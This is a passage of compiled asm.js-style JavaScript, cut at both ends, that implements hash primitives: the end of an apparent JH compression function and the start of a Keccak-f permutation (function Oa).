                ba = ea & _ ^ ba;
                L = L ^ X & U;
                M = M ^ V & fa;
                Y = Y ^ I & o;
                _ = _ ^ K & J;
                g = X & ~O;
                i = V & ~P;
                U = g ^ U;
                fa = i ^ fa;
                k = I & ~ca;
                m = K & ~ea;
                o = k ^ o;
                J = m ^ J;
                O = O ^ L & X;
                P = P ^ M & V;
                ca = Y & I ^ ca;
                ea = _ & K ^ ea;
                X = (g ^ h) & L ^ X;
                V = (i ^ j) & M ^ V;
                I = (k ^ l) & Y ^ I;
                K = (m ^ n) & _ ^ K;
                L = (U | O) ^ L;
                M = (fa | P) ^ M;
                Y = (ca | o) ^ Y;
                _ = (ea | J) ^ _;
                U = X & O ^ U;
                fa = V & P ^ fa;
                O = L & R ^ O;
                P = M & S ^ P;
                R = X ^ R;
                S = V ^ S;
                V = O ^ Y;
                X = P ^ _;
                Y = R ^ ca ^ Y & $;
                _ = S ^ ea ^ _ & ba;
                $ = L ^ $ ^ I ^ U;
                ba = M ^ ba ^ K ^ fa;
                ca = L ^ o ^ I & ca;
                ea = M ^ J ^ K & ea;
                c[N >> 2] = Y ^ L;
                c[N + 4 >> 2] = _ ^ M;
                c[Q >> 2] = $ ^ O;
                c[Q + 4 >> 2] = ba ^ P;
                c[T >> 2] = V ^ R ^ ca;
                c[T + 4 >> 2] = X ^ S ^ ea;
                c[W >> 2] = V ^ U;
                c[W + 4 >> 2] = X ^ fa;
                W = zb(V | 0, X | 0, 8) | 0;
                fa = y & -16711936;
                X = yb(V | 0, X | 0, 8) | 0;
                c[Z >> 2] = W & -16711936 | X & 16711935;
                c[Z + 4 >> 2] = fa | y & 16711935;
                Z = zb(Y | 0, _ | 0, 8) | 0;
                fa = y & -16711936;
                _ = yb(Y | 0, _ | 0, 8) | 0;
                c[aa >> 2] = Z & -16711936 | _ & 16711935;
                c[aa + 4 >> 2] = fa | y & 16711935;
                aa = zb($ | 0, ba | 0, 8) | 0;
                fa = y & -16711936;
                ba = yb($ | 0, ba | 0, 8) | 0;
                c[da >> 2] = aa & -16711936 | ba & 16711935;
                c[da + 4 >> 2] = fa | y & 16711935;
                da = zb(ca | 0, ea | 0, 8) | 0;
                fa = y & -16711936;
                ea = yb(ca | 0, ea | 0, 8) | 0;
                c[ga >> 2] = da & -16711936 | ea & 16711935;
                c[ga + 4 >> 2] = fa | y & 16711935;
                ga = wb(f | 0, b | 0, 1, 0) | 0;
                fa = y;
                if (fa >>> 0 < 0 | (fa | 0) == 0 & ga >>> 0 < 2) {
                    b = 0;
                    f = 1
                } else break
            }
            f = wb(A | 0, B | 0, 4, 0) | 0;
            f = 8271 + (f << 5) | 0;
            b = 0;
            e = 0;
            while (1) {
                W = a + 128 + (b << 3) | 0;
                j = W;
                h = c[j >> 2] | 0;
                j = c[j + 4 >> 2] | 0;
                U = ~h;
                fa = ~j;
                ga = a + 144 + (b << 3) | 0;
                n = ga;
                l = c[n >> 2] | 0;
                n = c[n + 4 >> 2] | 0;
                o = ~l;
                J = ~n;
                T = a + 96 + (b << 3) | 0;
                V = T;
                X = c[V >> 2] | 0;
                V = c[V + 4 >> 2] | 0;
                S = f + (b << 3) | 0;
                R = S;
                R = d[R >> 0] | d[R + 1 >> 0] << 8 | d[R + 2 >> 0] << 16 | d[R + 3 >> 0] << 24;
                S = S + 4 | 0;
                S = d[S >> 0] | d[S + 1 >> 0] << 8 | d[S + 2 >> 0] << 16 | d[S + 3 >> 0] << 24;
                N = a + 32 + (b << 3) | 0;
                M = N;
                L = c[M >> 2] ^ R & ~X;
                M = c[M + 4 >> 2] ^ S & ~V;
                da = a + 112 + (b << 3) | 0;
                K = da;
                I = c[K >> 2] | 0;
                K = c[K + 4 >> 2] | 0;
                ba = f + ((b | 2) << 3) | 0;
                $ = ba;
                $ = d[$ >> 0] | d[$ + 1 >> 0] << 8 | d[$ + 2 >> 0] << 16 | d[$ + 3 >> 0] << 24;
                ba = ba + 4 | 0;
                ba = d[ba >> 0] | d[ba + 1 >> 0] << 8 | d[ba + 2 >> 0] << 16 | d[ba + 3 >> 0] << 24;
                Z = a + 48 + (b << 3) | 0;
                _ = Z;
                Y = c[_ >> 2] ^ $ & ~I;
                _ = c[_ + 4 >> 2] ^ ba & ~K;
                Q = a + 64 + (b << 3) | 0;
                P = Q;
                O = c[P >> 2] | 0;
                P = c[P + 4 >> 2] | 0;
                R = O & L ^ R;
                S = P & M ^ S;
                aa = a + 80 + (b << 3) | 0;
                ea = aa;
                ca = c[ea >> 2] | 0;
                ea = c[ea + 4 >> 2] | 0;
                $ = ca & Y ^ $;
                ba = ea & _ ^ ba;
                L = L ^ X & U;
                M = M ^ V & fa;
                Y = Y ^ I & o;
                _ = _ ^ K & J;
                g = X & ~O;
                i = V & ~P;
                U = g ^ U;
                fa = i ^ fa;
                k = I & ~ca;
                m = K & ~ea;
                o = k ^ o;
                J = m ^ J;
                O = O ^ L & X;
                P = P ^ M & V;
                ca = Y & I ^ ca;
                ea = _ & K ^ ea;
                X = (g ^ h) & L ^ X;
                V = (i ^ j) & M ^ V;
                I = (k ^ l) & Y ^ I;
                K = (m ^ n) & _ ^ K;
                L = (U | O) ^ L;
                M = (fa | P) ^ M;
                Y = (ca | o) ^ Y;
                _ = (ea | J) ^ _;
                U = X & O ^ U;
                fa = V & P ^ fa;
                O = L & R ^ O;
                P = M & S ^ P;
                R = X ^ R;
                S = V ^ S;
                V = O ^ Y;
                X = P ^ _;
                Y = R ^ ca ^ Y & $;
                _ = S ^ ea ^ _ & ba;
                $ = L ^ $ ^ I ^ U;
                ba = M ^ ba ^ K ^ fa;
                ca = L ^ o ^ I & ca;
                ea = M ^ J ^ K & ea;
                c[N >> 2] = Y ^ L;
                c[N + 4 >> 2] = _ ^ M;
                c[Q >> 2] = $ ^ O;
                c[Q + 4 >> 2] = ba ^ P;
                c[T >> 2] = V ^ R ^ ca;
                c[T + 4 >> 2] = X ^ S ^ ea;
                c[W >> 2] = V ^ U;
                c[W + 4 >> 2] = X ^ fa;
                W = zb(V | 0, X | 0, 16) | 0;
                fa = y & -65536;
                X = yb(V | 0, X | 0, 16) | 0;
                c[Z >> 2] = W & -65536 | X & 65535;
                c[Z + 4 >> 2] = fa | y & 65535;
                Z = zb(Y | 0, _ | 0, 16) | 0;
                fa = y & -65536;
                _ = yb(Y | 0, _ | 0, 16) | 0;
                c[aa >> 2] = Z & -65536 | _ & 65535;
                c[aa + 4 >> 2] = fa | y & 65535;
                aa = zb($ | 0, ba | 0, 16) | 0;
                fa = y & -65536;
                ba = yb($ | 0, ba | 0, 16) | 0;
                c[da >> 2] = aa & -65536 | ba & 65535;
                c[da + 4 >> 2] = fa | y & 65535;
                da = zb(ca | 0, ea | 0, 16) | 0;
                fa = y & -65536;
                ea = yb(ca | 0, ea | 0, 16) | 0;
                c[ga >> 2] = da & -65536 | ea & 65535;
                c[ga + 4 >> 2] = fa | y & 65535;
                ga = wb(b | 0, e | 0, 1, 0) | 0;
                fa = y;
                if (fa >>> 0 < 0 | (fa | 0) == 0 & ga >>> 0 < 2) {
                    b = 1;
                    e = 0
                } else break
            }
            b = wb(A | 0, B | 0, 5, 0) | 0;
            b = 8271 + (b << 5) | 0;
            e = 0;
            f = 0;
            while (1) {
                W = a + 128 + (e << 3) | 0;
                j = W;
                h = c[j >> 2] | 0;
                j = c[j + 4 >> 2] | 0;
                U = ~h;
                V = ~j;
                ga = a + 144 + (e << 3) | 0;
                n = ga;
                l = c[n >> 2] | 0;
                n = c[n + 4 >> 2] | 0;
                o = ~l;
                J = ~n;
                T = a + 96 + (e << 3) | 0;
                Y = T;
                X = c[Y >> 2] | 0;
                Y = c[Y + 4 >> 2] | 0;
                S = b + (e << 3) | 0;
                R = S;
                R = d[R >> 0] | d[R + 1 >> 0] << 8 | d[R + 2 >> 0] << 16 | d[R + 3 >> 0] << 24;
                S = S + 4 | 0;
                S = d[S >> 0] | d[S + 1 >> 0] << 8 | d[S + 2 >> 0] << 16 | d[S + 3 >> 0] << 24;
                N = a + 32 + (e << 3) | 0;
                M = N;
                L = c[M >> 2] ^ R & ~X;
                M = c[M + 4 >> 2] ^ S & ~Y;
                da = a + 112 + (e << 3) | 0;
                K = da;
                I = c[K >> 2] | 0;
                K = c[K + 4 >> 2] | 0;
                ba = b + ((e | 2) << 3) | 0;
                ca = ba;
                ca = d[ca >> 0] | d[ca + 1 >> 0] << 8 | d[ca + 2 >> 0] << 16 | d[ca + 3 >> 0] << 24;
                ba = ba + 4 | 0;
                ba = d[ba >> 0] | d[ba + 1 >> 0] << 8 | d[ba + 2 >> 0] << 16 | d[ba + 3 >> 0] << 24;
                Z = a + 48 + (e << 3) | 0;
                _ = Z;
                $ = c[_ >> 2] ^ ca & ~I;
                _ = c[_ + 4 >> 2] ^ ba & ~K;
                Q = a + 64 + (e << 3) | 0;
                P = Q;
                O = c[P >> 2] | 0;
                P = c[P + 4 >> 2] | 0;
                R = O & L ^ R;
                S = P & M ^ S;
                aa = a + 80 + (e << 3) | 0;
                ea = aa;
                fa = c[ea >> 2] | 0;
                ea = c[ea + 4 >> 2] | 0;
                ca = fa & $ ^ ca;
                ba = ea & _ ^ ba;
                L = L ^ X & U;
                M = M ^ Y & V;
                $ = $ ^ I & o;
                _ = _ ^ K & J;
                g = X & ~O;
                i = Y & ~P;
                U = g ^ U;
                V = i ^ V;
                k = I & ~fa;
                m = K & ~ea;
                o = k ^ o;
                J = m ^ J;
                O = O ^ L & X;
                P = P ^ M & Y;
                fa = $ & I ^ fa;
                ea = _ & K ^ ea;
                X = (g ^ h) & L ^ X;
                Y = (i ^ j) & M ^ Y;
                I = (k ^ l) & $ ^ I;
                K = (m ^ n) & _ ^ K;
                L = (U | O) ^ L;
                M = (V | P) ^ M;
                $ = (fa | o) ^ $;
                _ = (ea | J) ^ _;
                U = X & O ^ U;
                V = Y & P ^ V;
                O = L & R ^ O;
                P = M & S ^ P;
                R = X ^ R;
                S = Y ^ S;
                Y = O ^ $;
                X = P ^ _;
                $ = R ^ fa ^ $ & ca;
                _ = S ^ ea ^ _ & ba;
                ca = L ^ ca ^ I ^ U;
                ba = M ^ ba ^ K ^ V;
                fa = L ^ o ^ I & fa;
                ea = M ^ J ^ K & ea;
                c[N >> 2] = $ ^ L;
                c[N + 4 >> 2] = _ ^ M;
                c[Q >> 2] = ca ^ O;
                c[Q + 4 >> 2] = ba ^ P;
                c[T >> 2] = Y ^ R ^ fa;
                c[T + 4 >> 2] = X ^ S ^ ea;
                c[W >> 2] = Y ^ U;
                c[W + 4 >> 2] = X ^ V;
                c[Z >> 2] = X;
                c[Z + 4 >> 2] = Y;
                c[aa >> 2] = _;
                c[aa + 4 >> 2] = $;
                c[da >> 2] = ba;
                c[da + 4 >> 2] = ca;
                c[ga >> 2] = ea;
                c[ga + 4 >> 2] = fa;
                ga = wb(e | 0, f | 0, 1, 0) | 0;
                fa = y;
                if (fa >>> 0 < 0 | (fa | 0) == 0 & ga >>> 0 < 2) {
                    e = 1;
                    f = 0
                } else break
            }
            b = wb(A | 0, B | 0, 6, 0) | 0;
            b = 8271 + (b << 5) | 0;
            e = 0;
            f = 0;
            while (1) {
                ga = a + 128 + (e << 3) | 0;
                j = ga;
                h = c[j >> 2] | 0;
                j = c[j + 4 >> 2] | 0;
                da = ~h;
                fa = ~j;
                O = a + 144 + (e << 3) | 0;
                n = O;
                l = c[n >> 2] | 0;
                n = c[n + 4 >> 2] | 0;
                K = ~l;
                M = ~n;
                ba = a + 96 + (e << 3) | 0;
                ca = ba;
                ea = c[ca >> 2] | 0;
                ca = c[ca + 4 >> 2] | 0;
                $ = b + (e << 3) | 0;
                Z = $;
                Z = d[Z >> 0] | d[Z + 1 >> 0] << 8 | d[Z + 2 >> 0] << 16 | d[Z + 3 >> 0] << 24;
                $ = $ + 4 | 0;
                $ = d[$ >> 0] | d[$ + 1 >> 0] << 8 | d[$ + 2 >> 0] << 16 | d[$ + 3 >> 0] << 24;
                T = a + 32 + (e << 3) | 0;
                S = T;
                Q = c[S >> 2] ^ Z & ~ea;
                S = c[S + 4 >> 2] ^ $ & ~ca;
                J = a + 112 + (e << 3) | 0;
                N = J;
                L = c[N >> 2] | 0;
                N = c[N + 4 >> 2] | 0;
                W = b + ((e | 2) << 3) | 0;
                U = W;
                U = d[U >> 0] | d[U + 1 >> 0] << 8 | d[U + 2 >> 0] << 16 | d[U + 3 >> 0] << 24;
                W = W + 4 | 0;
                W = d[W >> 0] | d[W + 1 >> 0] << 8 | d[W + 2 >> 0] << 16 | d[W + 3 >> 0] << 24;
                o = a + 48 + (e << 3) | 0;
                R = o;
                P = c[R >> 2] ^ U & ~L;
                R = c[R + 4 >> 2] ^ W & ~N;
                Y = a + 64 + (e << 3) | 0;
                X = Y;
                V = c[X >> 2] | 0;
                X = c[X + 4 >> 2] | 0;
                Z = V & Q ^ Z;
                $ = X & S ^ $;
                I = a + 80 + (e << 3) | 0;
                aa = I;
                _ = c[aa >> 2] | 0;
                aa = c[aa + 4 >> 2] | 0;
                U = _ & P ^ U;
                W = aa & R ^ W;
                Q = Q ^ ea & da;
                S = S ^ ca & fa;
                P = P ^ L & K;
                R = R ^ N & M;
                g = ea & ~V;
                i = ca & ~X;
                da = g ^ da;
                fa = i ^ fa;
                k = L & ~_;
                m = N & ~aa;
                K = k ^ K;
                M = m ^ M;
                V = V ^ Q & ea;
                X = X ^ S & ca;
                _ = P & L ^ _;
                aa = R & N ^ aa;
                ea = (g ^ h) & Q ^ ea;
                ca = (i ^ j) & S ^ ca;
                L = (k ^ l) & P ^ L;
                N = (m ^ n) & R ^ N;
                Q = (da | V) ^ Q;
                S = (fa | X) ^ S;
                P = (_ | K) ^ P;
                R = (aa | M) ^ R;
                da = ea & V ^ da;
                fa = ca & X ^ fa;
                V = Q & Z ^ V;
                X = S & $ ^ X;
                Z = ea ^ Z;
                $ = ca ^ $;
                ca = V ^ P;
                ea = X ^ R;
                c[o >> 2] = ca;
                c[o + 4 >> 2] = ea;
                P = Z ^ _ ^ P & U;
                R = $ ^ aa ^ R & W;
                c[I >> 2] = P;
                c[I + 4 >> 2] = R;
                U = Q ^ U ^ L ^ da;
                W = S ^ W ^ N ^ fa;
                c[J >> 2] = U;
                c[J + 4 >> 2] = W;
                _ = Q ^ K ^ L & _;
                aa = S ^ M ^ N & aa;
                c[O >> 2] = _;
                c[O + 4 >> 2] = aa;
                c[T >> 2] = P ^ Q;
                c[T + 4 >> 2] = R ^ S;
                c[Y >> 2] = U ^ V;
                c[Y + 4 >> 2] = W ^ X;
                c[ba >> 2] = ca ^ Z ^ _;
                c[ba + 4 >> 2] = ea ^ $ ^ aa;
                c[ga >> 2] = ca ^ da;
                c[ga + 4 >> 2] = ea ^ fa;
                ga = wb(e | 0, f | 0, 1, 0) | 0;
                fa = y;
                if (fa >>> 0 < 0 | (fa | 0) == 0 & ga >>> 0 < 2) {
                    e = 1;
                    f = 0
                } else break
            }
            k = E;
            b = c[k >> 2] | 0;
            k = c[k + 4 >> 2] | 0;
            g = G;
            h = c[g >> 2] | 0;
            g = c[g + 4 >> 2] | 0;
            e = E;
            c[e >> 2] = h;
            c[e + 4 >> 2] = g;
            e = G;
            c[e >> 2] = b;
            c[e + 4 >> 2] = k;
            e = s;
            k = c[e >> 2] | 0;
            e = c[e + 4 >> 2] | 0;
            b = u;
            f = c[b >> 2] | 0;
            b = c[b + 4 >> 2] | 0;
            i = s;
            c[i >> 2] = f;
            c[i + 4 >> 2] = b;
            i = u;
            c[i >> 2] = k;
            c[i + 4 >> 2] = e;
            i = v;
            e = c[i >> 2] | 0;
            i = c[i + 4 >> 2] | 0;
            k = w;
            j = c[k >> 2] | 0;
            k = c[k + 4 >> 2] | 0;
            m = v;
            c[m >> 2] = j;
            c[m + 4 >> 2] = k;
            m = w;
            c[m >> 2] = e;
            c[m + 4 >> 2] = i;
            m = x;
            l = c[m >> 2] | 0;
            m = c[m + 4 >> 2] | 0;
            o = z;
            n = c[o >> 2] | 0;
            o = c[o + 4 >> 2] | 0;
            ga = x;
            c[ga >> 2] = n;
            c[ga + 4 >> 2] = o;
            ga = z;
            c[ga >> 2] = l;
            c[ga + 4 >> 2] = m;
            A = wb(A | 0, B | 0, 7, 0) | 0;
            B = y
        } while (B >>> 0 < 0 | (B | 0) == 0 & A >>> 0 < 42);
        ga = p;
        fa = a + 96 | 0;
        ea = fa;
        da = c[ea + 4 >> 2] ^ c[ga + 4 >> 2];
        c[fa >> 2] = c[ea >> 2] ^ c[ga >> 2];
        c[fa + 4 >> 2] = da;
        fa = C;
        da = a + 104 | 0;
        ga = da;
        ea = c[ga + 4 >> 2] ^ c[fa + 4 >> 2];
        c[da >> 2] = c[ga >> 2] ^ c[fa >> 2];
        c[da + 4 >> 2] = ea;
        da = D;
        ea = k ^ c[da + 4 >> 2];
        fa = v;
        c[fa >> 2] = j ^ c[da >> 2];
        c[fa + 4 >> 2] = ea;
        fa = F;
        ea = i ^ c[fa + 4 >> 2];
        da = w;
        c[da >> 2] = e ^ c[fa >> 2];
        c[da + 4 >> 2] = ea;
        da = H;
        ea = a + 128 | 0;
        fa = ea;
        ga = c[fa + 4 >> 2] ^ c[da + 4 >> 2];
        c[ea >> 2] = c[fa >> 2] ^ c[da >> 2];
        c[ea + 4 >> 2] = ga;
        ea = q;
        ga = a + 136 | 0;
        da = ga;
        fa = c[da + 4 >> 2] ^ c[ea + 4 >> 2];
        c[ga >> 2] = c[da >> 2] ^ c[ea >> 2];
        c[ga + 4 >> 2] = fa;
        ga = r;
        fa = o ^ c[ga + 4 >> 2];
        ea = x;
        c[ea >> 2] = n ^ c[ga >> 2];
        c[ea + 4 >> 2] = fa;
        ea = t;
        fa = m ^ c[ea + 4 >> 2];
        ga = z;
        c[ga >> 2] = l ^ c[ea >> 2];
        c[ga + 4 >> 2] = fa;
        return
    }

    function Oa(a, b) {
        a = a | 0;
        b = b | 0;
        var d = 0,
            e = 0,
            f = 0,
            g = 0,
            h = 0,
            i = 0,
            j = 0,
            k = 0,
            l = 0,
            m = 0,
            n = 0,
            o = 0,
            p = 0,
            q = 0,
            r = 0,
            s = 0,
            t = 0,
            u = 0,
            v = 0,
            w = 0,
            x = 0,
            z = 0,
            A = 0,
            B = 0,
            C = 0,
            D = 0,
            E = 0,
            F = 0,
            G = 0,
            H = 0,
            I = 0,
            J = 0,
            K = 0,
            L = 0,
            M = 0,
            N = 0,
            O = 0,
            P = 0,
            Q = 0,
            R = 0,
            S = 0,
            T = 0,
            U = 0,
            V = 0,
            W = 0,
            X = 0,
            Y = 0,
            Z = 0,
            _ = 0,
            $ = 0,
            aa = 0,
            ba = 0,
            ca = 0,
            da = 0,
            ea = 0,
            fa = 0,
            ga = 0,
            ha = 0,
            ia = 0,
            ja = 0,
            ka = 0,
            la = 0,
            ma = 0,
            na = 0,
            oa = 0,
            pa = 0,
            qa = 0,
            ra = 0,
            sa = 0,
            ta = 0,
            ua = 0,
            va = 0,
            wa = 0,
            xa = 0,
            ya = 0,
            za = 0,
            Aa = 0,
            Ba = 0,
            Ca = 0;
        if ((b | 0) <= 0) return;
        ga = a + 40 | 0;
        ha = a + 80 | 0;
        ia = a + 120 | 0;
        ja = a + 160 | 0;
        ka = a + 8 | 0;
        la = a + 48 | 0;
        ma = a + 88 | 0;
        R = a + 128 | 0;
        S = a + 168 | 0;
        T = a + 16 | 0;
        U = a + 56 | 0;
        V = a + 96 | 0;
        W = a + 136 | 0;
        X = a + 176 | 0;
        Y = a + 24 | 0;
        Z = a + 64 | 0;
        _ = a + 104 | 0;
        $ = a + 144 | 0;
        aa = a + 184 | 0;
        ba = a + 32 | 0;
        ca = a + 72 | 0;
        da = a + 112 | 0;
        ea = a + 152 | 0;
        fa = a + 192 | 0;
        e = a;
        g = ha;
        i = ia;
        k = ja;
        m = ma;
        o = R;
        q = S;
        u = V;
        w = W;
        z = X;
        D = _;
        F = $;
        H = aa;
        L = da;
        N = ea;
        P = fa;
        s = U;
        B = Z;
        J = ca;
        Q = 0;
        d = c[e >> 2] | 0;
        e = c[e + 4 >> 2] | 0;
        f = c[g >> 2] | 0;
        g = c[g + 4 >> 2] | 0;
        h = c[i >> 2] | 0;
        i = c[i + 4 >> 2] | 0;
        j = c[k >> 2] | 0;
        k = c[k + 4 >> 2] | 0;
        l = c[m >> 2] | 0;
        m = c[m + 4 >> 2] | 0;
        n = c[o >> 2] | 0;
        o = c[o + 4 >> 2] | 0;
        p = c[q >> 2] | 0;
        q = c[q + 4 >> 2] | 0;
        r = c[s >> 2] | 0;
        s = c[s + 4 >> 2] | 0;
        t = c[u >> 2] | 0;
        u = c[u + 4 >> 2] | 0;
        v = c[w >> 2] | 0;
        w = c[w + 4 >> 2] | 0;
        x = c[z >> 2] | 0;
        z = c[z + 4 >> 2] | 0;
        A = c[B >> 2] | 0;
        B = c[B + 4 >> 2] | 0;
        C = c[D >> 2] | 0;
        D = c[D + 4 >> 2] | 0;
        E = c[F >> 2] | 0;
        F = c[F + 4 >> 2] | 0;
        G = c[H >> 2] | 0;
        H = c[H + 4 >> 2] | 0;
        I = c[J >> 2] | 0;
        J = c[J + 4 >> 2] | 0;
        K = c[L >> 2] | 0;
        L = c[L + 4 >> 2] | 0;
        M = c[N >> 2] | 0;
        N = c[N + 4 >> 2] | 0;
        O = c[P >> 2] | 0;
        P = c[P + 4 >> 2] | 0;
        do {
            Ba = ga;
            Ca = c[Ba >> 2] | 0;
            Ba = c[Ba + 4 >> 2] | 0;
            oa = Ca ^ d ^ f ^ h ^ j;
            na = Ba ^ e ^ g ^ i ^ k;
            za = ka;
            Aa = c[za >> 2] | 0;
            za = c[za + 4 >> 2] | 0;
            xa = la;
            ya = c[xa >> 2] | 0;
            xa = c[xa + 4 >> 2] | 0;
            wa = ya ^ Aa ^ l ^ n ^ p;
            va = xa ^ za ^ m ^ o ^ q;
            ta = T;
            ua = c[ta >> 2] | 0;
            ta = c[ta + 4 >> 2] | 0;
            sa = r ^ ua ^ t ^ v ^ x;
            ra = s ^ ta ^ u ^ w ^ z;
            pa = Y;
            qa = c[pa >> 2] | 0;
            pa = c[pa + 4 >> 2] | 0;
            E = A ^ qa ^ C ^ E ^ G;
            F = B ^ pa ^ D ^ F ^ H;
            H = ba;
            G = c[H >> 2] | 0;
            H = c[H + 4 >> 2] | 0;
            M = I ^ G ^ K ^ M ^ O;
            O = J ^ H ^ L ^ N ^ P;
            L = zb(wa | 0, va | 0, 1) | 0;
            P = y;
            N = yb(wa | 0, va | 0, 63) | 0;
            N = (L | N) ^ M;
            P = (P | y) ^ O;
            L = a;
            c[L >> 2] = N ^ d;
            c[L + 4 >> 2] = P ^ e;
            e = ga;
            c[e >> 2] = Ca ^ N;
            c[e + 4 >> 2] = Ba ^ P;
            e = ha;
            c[e >> 2] = f ^ N;
            c[e + 4 >> 2] = g ^ P;
            e = ia;
            c[e >> 2] = h ^ N;
            c[e + 4 >> 2] = i ^ P;
            e = ja;
            c[e >> 2] = j ^ N;
            c[e + 4 >> 2] = k ^ P;
            e = zb(sa | 0, ra | 0, 1) | 0;
            P = y;
            N = yb(sa | 0, ra | 0, 63) | 0;
            N = (e | N) ^ oa;
            P = (P | y) ^ na;
            e = N ^ Aa;
            f = P ^ za;
            d = ka;
            c[d >> 2] = e;
            c[d + 4 >> 2] = f;
            d = la;
            c[d >> 2] = ya ^ N;
            c[d + 4 >> 2] = xa ^ P;
            d = ma;
            c[d >> 2] = l ^ N;
            c[d + 4 >> 2] = m ^ P;
            d = R;
            c[d >> 2] = n ^ N;
            c[d + 4 >> 2] = o ^ P;
            d = S;
            c[d >> 2] = p ^ N;
            c[d + 4 >> 2] = q ^ P;
            d = zb(E | 0, F | 0, 1) | 0;
            P = y;
            N = yb(E | 0, F | 0, 63) | 0;
            N = (d | N) ^ wa;
            P = (P | y) ^ va;
            d = T;
            c[d >> 2] = N ^ ua;
            c[d + 4 >> 2] = P ^ ta;
            d = U;
            c[d >> 2] = r ^ N;
            c[d + 4 >> 2] = s ^ P;
            d = V;
            c[d >> 2] = t ^ N;
            c[d + 4 >> 2] = u ^ P;
            d = W;
            c[d >> 2] = v ^ N;
            c[d + 4 >> 2] = w ^ P;
            d = X;
            c[d >> 2] = x ^ N;
            c[d + 4 >> 2] = z ^ P;
            d = zb(M | 0, O | 0, 1) | 0;
            P = y;
            O = yb(M | 0, O | 0, 63) | 0;
            O = (d | O) ^ sa;
            P = (P | y) ^ ra;
            d = Y;
            c[d >> 2] = O ^ qa;
            c[d + 4 >> 2] = P ^ pa;
            d = Z;
            c[d >> 2] = A ^ O;
            c[d + 4 >> 2] = B ^ P;
            d = _;
            N = c[d + 4 >> 2] ^ P;
            M = _;
            c[M >> 2] = c[d >> 2] ^ O;
            c[M + 4 >> 2] = N;
            M = $;
            N = c[M + 4 >> 2] ^ P;
            d = $;
            c[d >> 2] = c[M >> 2] ^ O;
            c[d + 4 >> 2] = N;
            d = aa;
            P = c[d + 4 >> 2] ^ P;
            N = aa;
            c[N >> 2] = c[d >> 2] ^ O;
            c[N + 4 >> 2] = P;
            N = zb(oa | 0, na | 0, 1) | 0;
            P = y;
            O = yb(oa | 0, na | 0, 63) | 0;
            O = (N | O) ^ E;
            P = (P | y) ^ F;
            N = ba;
            c[N >> 2] = O ^ G;
            c[N + 4 >> 2] = P ^ H;
            N = ca;
            c[N >> 2] = I ^ O;
            c[N + 4 >> 2] = J ^ P;
            N = da;
            d = c[N + 4 >> 2] ^ P;
            M = da;
            c[M >> 2] = c[N >> 2] ^ O;
            c[M + 4 >> 2] = d;
            M = ea;
            d = c[M + 4 >> 2] ^ P;
            N = ea;
            c[N >> 2] = c[M >> 2] ^ O;
            c[N + 4 >> 2] = d;
            N = fa;
            P = c[N + 4 >> 2] ^ P;
            d = fa;
            c[d >> 2] = c[N >> 2] ^ O;
            c[d + 4 >> 2] = P;
            d = 0;
            do {
                Ca = a + (c[6912 + (d << 2) >> 2] << 3) | 0;
                za = Ca;
                xa = e;
                e = c[za >> 2] | 0;
                ya = f;
                f = c[za + 4 >> 2] | 0;
                za = c[6816 + (d << 2) >> 2] | 0;
                Aa = zb(xa | 0, ya | 0, za | 0) | 0;
                Ba = y;
                za = yb(xa | 0, ya | 0, 64 - za | 0) | 0;
                c[Ca >> 2] = za | Aa;
                c[Ca + 4 >> 2] = y | Ba;
                d = d + 1 | 0
            } while ((d | 0) != 24);
            d = a;
            r = c[d >> 2] | 0;
            d = c[d + 4 >> 2] | 0;
            Ba = ka;
            B = c[Ba >> 2] | 0;
            Ba = c[Ba + 4 >> 2] | 0;
            I = T;
            u = c[I >> 2] | 0;
            I = c[I + 4 >> 2] | 0;
            A = Y;
            J = c[A >> 2] | 0;
            A = c[A + 4 >> 2] | 0;
            Ca = ba;
            s = c[Ca >> 2] | 0;
            Ca = c[Ca + 4 >> 2] | 0;
            e = a;
            c[e >> 2] = u & ~B ^ r;
            c[e + 4 >> 2] = I & ~Ba ^ d;
            e = ka;
            c[e >> 2] = J & ~u ^ B;
            c[e + 4 >> 2] = A & ~I ^ Ba;
            e = T;
            c[e >> 2] = s & ~J ^ u;
            c[e + 4 >> 2] = Ca & ~A ^ I;
            e = Y;
            c[e >> 2] = r & ~s ^ J;
            c[e + 4 >> 2] = d & ~Ca ^ A;
            e = ba;
            c[e >> 2] = B & ~r ^ s;
            c[e + 4 >> 2] = Ba & ~d ^ Ca;
            e = ga;
            Ca = c[e >> 2] | 0;
            e = c[e + 4 >> 2] | 0;
            d = la;
            Ba = c[d >> 2] | 0;
            d = c[d + 4 >> 2] | 0;
            s = U;
            r = c[s >> 2] | 0;
            s = c[s + 4 >> 2] | 0;
            B = Z;
            A = c[B >> 2] | 0;
            B = c[B + 4 >> 2] | 0;
            J = ca;
            I = c[J >> 2] | 0;
            J = c[J + 4 >> 2] | 0;
            u = ga;
            c[u >> 2] = r & ~Ba ^ Ca;
            c[u + 4 >> 2] = s & ~d ^ e;
            u = la;
            c[u >> 2] = A & ~r ^ Ba;
            c[u + 4 >> 2] = B & ~s ^ d;
            r = I & ~A ^ r;
            s = J & ~B ^ s;
            u = U;
            c[u >> 2] = r;
            c[u + 4 >> 2] = s;
            A = Ca & ~I ^ A;
            B = e & ~J ^ B;
            u = Z;
            c[u >> 2] = A;
            c[u + 4 >> 2] = B;
            I = Ba & ~Ca ^ I;
            J = d & ~e ^ J;
            e = ca;
            c[e >> 2] = I;
            c[e + 4 >> 2] = J;
            e = ha;
            d = c[e >> 2] | 0;
            e = c[e + 4 >> 2] | 0;
            Ca = ma;
            Ba = c[Ca >> 2] | 0;
            Ca = c[Ca + 4 >> 2] | 0;
            u = V;
            t = c[u >> 2] | 0;
            u = c[u + 4 >> 2] | 0;
            D = _;
            C = c[D >> 2] | 0;
            D = c[D + 4 >> 2] | 0;
            L = da;
            K = c[L >> 2] | 0;
            L = c[L + 4 >> 2] | 0;
            f = t & ~Ba ^ d;
            g = u & ~Ca ^ e;
            l = ha;
            c[l >> 2] = f;
            c[l + 4 >> 2] = g;
            l = C & ~t ^ Ba;
            m = D & ~u ^ Ca;
            w = ma;
            c[w >> 2] = l;
            c[w + 4 >> 2] = m;
            t = K & ~C ^ t;
            u = L & ~D ^ u;
            w = V;
            c[w >> 2] = t;
            c[w + 4 >> 2] = u;
            C = d & ~K ^ C;
            D = e & ~L ^ D;
            w = _;
            c[w >> 2] = C;
            c[w + 4 >> 2] = D;
            K = Ba & ~d ^ K;
            L = Ca & ~e ^ L;
            e = da;
            c[e >> 2] = K;
            c[e + 4 >> 2] = L;
            e = ia;
            Ca = c[e >> 2] | 0;
            e = c[e + 4 >> 2] | 0;
            d = R;
            Ba = c[d >> 2] | 0;
            d = c[d + 4 >> 2] | 0;
            w = W;
            v = c[w >> 2] | 0;
